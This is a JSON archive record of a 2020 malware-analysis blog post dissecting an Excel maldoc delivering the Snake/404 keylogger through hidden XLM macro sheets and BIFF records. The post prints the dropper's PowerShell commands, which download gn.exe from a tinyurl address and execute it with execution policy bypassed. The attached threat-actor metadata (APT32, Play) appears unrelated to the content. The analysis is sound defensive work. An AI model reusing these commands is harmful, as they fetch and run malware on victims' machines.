{
    "id": "0c857bb8-e4be-4eaf-b27f-7b2430f3bf29",
    "created_at": "2023-01-12T15:02:43.012958Z",
    "updated_at": "2025-03-27T02:16:26.529744Z",
    "deleted_at": null,
    "sha1_hash": "605c9c96a391fa1507f8de95696d03bae10fce8f",
    "title": "2020-12-16 - Snake-404 Keylogger, BIFF, and Covering Tracks-- An unusual maldoc",
    "authors": "",
    "file_creation_date": "2022-05-28T03:31:51Z",
    "file_modification_date": "2022-05-28T03:31:51Z",
    "file_size": 657614,
    "plain_text": "# Snake/404 Keylogger, BIFF, and Covering Tracks?: An unusual maldoc\n\n**[clickallthethings.wordpress.com/2020/12/16/snake-404-keylogger-biff-and-covering-tracks-an-unusual-maldoc/](https://clickallthethings.wordpress.com/2020/12/16/snake-404-keylogger-biff-and-covering-tracks-an-unusual-maldoc/)**\n\nView all posts by Jamie December 16, 2020\n\nIt’s always interesting to see how attackers take a variety of techniques and wrap them up\ninto one document. Some are so heavily, heavily obfuscated that it’s rather easy to point and\nsay, “Oh, the malicious stuff is probably in there. I should focus on that.” Others are rather\nsparse and you have to spend some more time digging to put the clues together.\n\nThis evening’s document is the latter (https://app.any.run/tasks/6b24ab8c-1626-41e1**aa32-39e96fd266d5/). It contains password protected macros, but they’re empty. There’s an**\nXLM line that isn’t difficult to find and decode, but that single line doesn’t explain how the\n.exe gets downloaded.\n\nAll in all, the complication was finding the bits and pieces of code in the document and\nputting them together to match the Any.run behavior.\n\n## The Obvious XLM\n\nIf you open the spreadsheet and search for “=”, you’ll end up in cell H177.\n\nThe hex isn’t tough to decode. You end up with something like the command below.\nPowershell is used to change to the $env:appdata directory and execute gn.exe.\n\n\n-----\n\n```\n=EXEC(powershell -w 1 -EP bypass stARt-slEEp 25; cd ${enV :appdata};.\n('.'+'/gn.exe'))\n\n```\nHowever, where does gn.exe get downloaded?\n\n## BIFF – Binary Interchange File Format\n\nBIFF is the binary file format that is used to save Excel workbooks. This binary format is\nmore commonly referred to as XLS or MS-XLS and has been the default format for Excel\nthrough MS Office 2003. There have been a variety of BIFF versions over the years due to\nthe new versions of Excel (BIFF2 – Excel 2.1; BIFF3 – Excel 3.0; BIFF4 – Excel 4.0, etc.).\n\n.xls files are structured as OLE (object linking and embedding) compound files. These\ncompound files can store a variety of streams of data. One such place is in the BIFF records\nof a Workbook stream. We are used to using oledump.py to search for and dump macros.\nYet as I said above, these macros are empty.\n\n## oledump.py -p plugin_biff\n\n**oledump.py also lets us look through the BIFF records. We can do that with this command:**\n\n```\noledump.py -p plugin_biff --pluginoptions \"-x\" [document.xls]\n\n```\n\n-----\n\nThere s a lot of output here so let s take a look at it. The first line shows that a very hidden\nmacro sheet exists. We’ll need to take care of that. The fourth line shows that there is a cell\nwith the name Auto_Open which will execute as soon as the document is opened.\n\nThe remaining output shows FORMULA cells that will get executed in some way. Some of it\nis parsed successfully, others not so much. Either way, we can see a tinyurl.com address.\nthis is most likely the URL from which the .exe gets downloaded. These formulas are stored\nsomewhere. Let’s get that very hidden macro sheet unhidden and see what we can see.\n\n## Unhiding the macro sheet\n\n[This process of unhiding a macro sheet is outlined in more detail here. Essentially, we need](https://clickallthethings.wordpress.com/2020/04/06/covid-19-excel-4-0-macros-and-sandbox-detection/)\nto toss the following VBA in a macro and execute it. Of course, the macros in this document\n[are password protected, but other posts of mine show how to bypass it.](https://clickallthethings.wordpress.com/2019/08/21/trickbot-analysis-part-2-locked-projects-in-documents/)\n\nThis VBA code uncovers a new sheet in the document. We will need to change the font color\nfrom white to black to see them.\n\n\n-----\n\nWe can see the typical GET.WORKSPACE checks for a mouse (line 126) and the ability to\nplay sounds (line 127). After that, it takes the macro code from Sheet1 and copies it to D131.\n\nLine 129 contains the obfuscated line that does the actual downloading:\n```\npowershell -w 1 (nEw-oBjecT Net.WebcLIENt).\n('Down'+'loadFile').Invoke('https://tinyurl.com/y7zcye22','gn.exe')\n\n```\nWe already saw the deobfuscated command in line 131 above.\n\n## Covering Tracks?\n\n\n-----\n\nXLM code has the ability to make actual changes to the cells. This, in effect, also makes\nchanges to the document itself. Line 138 will save whatever changes have been made thus\nfar. And what do we notice happening right before that save? A blank cell is copied on top of\n131, a cell that contained the command to execute gn.exe.\n\nMy first thought that the purpose of overwriting line 131 was to make it tougher for incident\nresponders to analyze a possibly malicious document. I also initially thought that it was a\nmistake to overwrite line 130 as it was blank already. It seemed to me that 129 would be a\nbetter candidate as it contains another of the smoking guns that downloaded the malware.\n\nI don’t think this is likely for two reasons. First, if my theory is true, it means that each\nmalicious document in this campaign can be used only once. Once the XLM code is\nenabled, it gets one shot to reach out, download, and execute the malware before cleaning\nup its own tracks. There is no opportunity for the victim to try re-opening the document and\ngetting infected again. Second, there is no XLM code to overwrite the obfuscated command\nin Sheet1!H177. I think that if an attacker were concerned about covering his tracks in this\nway, this other command should be deleted as well.\n\n## Conclusion\n\nSo like I said, this document was unusual. It contained a lot of things we’ve seen before like\nXLM, very hidden sheets, and password-protected macros, but this was a new combination\nof a variety of techniques. Plus we saw the added XLM commands that delete lines. If\nsomeone’s got a better theory about its purpose, I’m all ears. I just wonder if we’re going to\nsee this technique more often? Ideas do have a way of getting around.\n\nThanks for reading.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-12-16 - Snake-404 Keylogger, BIFF, and Covering Tracks-- An unusual maldoc.pdf"
    ],
    "report_names": [
        "2020-12-16 - Snake-404 Keylogger, BIFF, and Covering Tracks-- An unusual maldoc.pdf"
    ],
    "threat_actors": [
        {
            "id": "870f6f62-84f5-48ca-a18e-cf2902cd6924",
            "created_at": "2022-10-25T15:50:23.303818Z",
            "updated_at": "2025-03-27T02:00:55.435309Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "APT32",
                "SeaLotus",
                "OceanLotus",
                "APT-C-00",
                "Canvas Cyclone"
            ],
            "source_name": "MITRE:APT32",
            "tools": [
                "Mimikatz",
                "ipconfig",
                "Kerrdown",
                "Cobalt Strike",
                "SOUNDBITE",
                "OSX_OCEANLOTUS.D",
                "KOMPROGO",
                "netsh",
                "RotaJakiro",
                "PHOREAL",
                "Arp",
                "Denis",
                "Goopy"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "af509bbb-8d18-4903-a9bd-9e94099c6b30",
            "created_at": "2023-01-06T13:46:38.585525Z",
            "updated_at": "2025-03-27T02:00:02.866727Z",
            "deleted_at": null,
            "main_name": "APT32",
            "aliases": [
                "TIN WOODLAWN",
                "OceanLotus Group",
                "OceanLotus",
                "Sea Lotus",
                "G0050",
                "Cobalt Kitty",
                "SeaLotus",
                "ATK17",
                "Ocean Lotus",
                "Ocean Buffalo",
                "POND LOACH",
                "Canvas Cyclone",
                "APT-C-00",
                "APT-32",
                "APT 32"
            ],
            "source_name": "MISPGALAXY:APT32",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2439ad53-39cc-4fff-8fdf-4028d65803c0",
            "created_at": "2022-10-25T16:07:23.353204Z",
            "updated_at": "2025-03-27T02:02:09.749502Z",
            "deleted_at": null,
            "main_name": "APT 32",
            "aliases": [
                "APT 32",
                "APT-C-00",
                "APT-LY-100",
                "ATK 17",
                "Lotus Bane",
                "Ocean Buffalo",
                "OceanLotus",
                "Operation Cobalt Kitty",
                "Operation PhantomLance",
                "Pond Loach",
                "SeaLotus",
                "SectorF01",
                "Tin Woodlawn"
            ],
            "source_name": "ETDA:APT 32",
            "tools": [
                "Agentemis",
                "Android.Backdoor.736.origin",
                "AtNow",
                "Backdoor.MacOS.OCEANLOTUS.F",
                "BadCake",
                "CACTUSTORCH",
                "CamCapture Plugin",
                "CinaRAT",
                "Cobalt Strike",
                "CobaltStrike",
                "Cuegoe",
                "DKMC",
                "Denis",
                "Goopy",
                "HiddenLotus",
                "KOMPROGO",
                "KerrDown",
                "METALJACK",
                "MSFvenom",
                "Mimikatz",
                "Nishang",
                "OSX_OCEANLOTUS.D",
                "OceanLotus",
                "PHOREAL",
                "PWNDROID1",
                "PhantomLance",
                "PowerSploit",
                "Quasar RAT",
                "QuasarRAT",
                "RatSnif",
                "Remy",
                "Remy RAT",
                "Rizzo",
                "Roland",
                "Roland RAT",
                "SOUNDBITE",
                "Salgorea",
                "Splinter RAT",
                "Terracotta VPN",
                "Yggdrasil",
                "cobeacon",
                "denesRAT",
                "fingerprintjs2"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535763,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653708711,
    "ts_modification_date": 1653708711,
    "files": {
        "pdf": "https://archive.orkl.eu/605c9c96a391fa1507f8de95696d03bae10fce8f.pdf",
        "text": "https://archive.orkl.eu/605c9c96a391fa1507f8de95696d03bae10fce8f.txt",
        "img": "https://archive.orkl.eu/605c9c96a391fa1507f8de95696d03bae10fce8f.jpg"
    }
}